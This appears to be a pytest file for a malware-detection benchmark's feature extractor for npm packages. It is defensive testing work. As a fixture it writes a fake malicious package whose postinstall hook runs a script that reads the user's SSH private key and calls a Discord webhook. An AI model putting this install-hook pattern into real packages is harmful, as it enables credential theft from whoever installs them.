"""benchmark/extract_features.py on a fixture run: detector columns from the JSONL, content columns from a synthetic
DataDog sample folder and a registry artifact served by a patched (offline) http_cache. No contents or paths in the
output."""
import csv
import io
import json
import sys
import tarfile
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parent.parent
sys.path[:0] = [str(ROOT), str(ROOT / "benchmark")]

import extract_features as X  # noqa: E402
import http_cache  # noqa: E402


def _rec(id_, cat, findings=(), dets=None, status="scored", kind="npm_tgz"):
    return {"id": id_, "category": cat, "status": status, "findings": list(findings), "detectors": dets or {},
            "artifact": {"kind": kind}, "run": {"snapshot": "2026-11-08"}}


def _tgz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for n, body in files.items():
            d = body.encode()
            ti = tarfile.TarInfo("package/" + n)
            ti.size = len(d)
            t.addfile(ti, io.BytesIO(d))
    return buf.getvalue()


def test_features_table(tmp_path):
    sd = tmp_path / "samples" / "datadog" / "npm" / "evil_1.0.0_abcd"
    sd.mkdir(parents=True)
    (sd / "package.json.sample").write_text(json.dumps({"name": "evil", "scripts": {"postinstall": "node i.js"}}))
    (sd / "i.js.sample").write_text("const fs=require('fs');fs.readFileSync(process.env.HOME+'/.ssh/id_rsa')\n"
                                    "require('https').request('https://discord.com/api/webhooks/1/x')\n")
    bad = _rec("DD-npm-evil-9.9.9-abcd", "known_bad",
               findings=[{"detector": "behavior_patterns", "tier": "high_risk"}, {"detector": "behavior_patterns", "tier": "review"}],
               dets={"behavior_patterns": {"n_findings": 2, "n_info": 1}, "setup_py_hook": {"n_findings": 0, "n_info": 0}})
    good = _rec("known_good:npm:okpkg@1.0.0", "known_good", dets={"behavior_patterns": {"n_findings": 0, "n_info": 3}})
    skipped = [_rec("replay:x", "replay"), _rec("known_bad:npm:gone@1", "known_bad", status="unobtainable")]
    run = tmp_path / "run.jsonl"
    run.write_text("\n".join(json.dumps(r) for r in [bad, good, *skipped]) + "\n")
    items = {bad["id"]: {"id": bad["id"], "source": "datadog", "ecosystem": "npm", "package": "evil", "version": "9.9.9",
                         "sample_dir": "datadog/npm/evil_1.0.0_abcd"},
             good["id"]: {"id": good["id"], "source": "known_good.csv", "ecosystem": "npm", "package": "okpkg", "version": "1.0.0"}}
    tb = "https://registry.npmjs.org/okpkg/-/okpkg-1.0.0.tgz"
    pk = {"name": "okpkg", "time": {"1.0.0": "2025-01-01T00:00:00Z"},
          "versions": {"1.0.0": {"dependencies": {}, "scripts": {}, "_npmUser": {"name": "a"},
                                 "dist": {"tarball": tb, "unpackedSize": 50}}}}
    blob = _tgz({"package.json": "{}", "index.js": "module.exports = 1\n"})
    jt = {"https://registry.npmjs.org/okpkg": pk}
    with patch.object(http_cache, "get_json", lambda u, headers=None, timeout=None: (jt[u], 200, None) if u in jt else (None, 404, None)), \
            patch.object(http_cache, "get_bytes", lambda u, m, timeout=None: (blob, None) if u == tb else (None, "offline: not cached")):
        records = X.read_run(run)
        assert sorted(r["id"] for r in records) == sorted([bad["id"], good["id"]])          # scored, benchmark sets only
        rows = X.build(records, items, tmp_path / "samples")
    out = X.write(rows, tmp_path / "features.csv")
    got = {r["id"]: r for r in csv.DictReader(open(out, encoding="utf-8"))}
    b, g = got[bad["id"]], got[good["id"]]
    assert (b["set"], b["label"], b["ecosystem"], b["artifact_kind"], b["contents_status"]) == ("known_bad", "1", "npm", "datadog_sample", "read")
    assert b["install_hook"] == "1" and b["inflated_version"] == "1" and int(b["file_count"]) == 2 and int(b["total_bytes"]) > 0
    assert int(b["cap_credential_env"]) >= 1 and int(b["cap_network"]) >= 1
    assert (b["det_behavior_patterns_high_risk"], b["det_behavior_patterns_review"], b["det_behavior_patterns_info"],
            b["det_behavior_patterns_findings"]) == ("1", "1", "1", "2")
    assert (g["label"], g["artifact_kind"], g["contents_status"], g["install_hook"], g["det_behavior_patterns_info"]) == \
        ("0", "npm_tgz", "read", "0", "3")
    text = out.read_text(encoding="utf-8")
    assert "readFileSync" not in text and "discord" not in text and "i.js" not in text and str(tmp_path) not in text
    assert list(got[bad["id"]])[:len(X.BASE_FIELDS)] == X.BASE_FIELDS


def test_cache_miss_leaves_content_columns_empty(tmp_path):
    rec = _rec("known_good:npm:missing@1.0.0", "known_good")
    item = {"id": rec["id"], "source": "known_good.csv", "ecosystem": "npm", "package": "missing", "version": "1.0.0"}
    with patch.object(http_cache, "get_json", lambda u, headers=None, timeout=None: (None, None, "offline: not cached")):
        rows = X.build([rec], {rec["id"]: item}, None)
    assert rows[0]["contents_status"] == "not in cache" and rows[0]["file_count"] == "" and rows[0]["cap_network"] == ""
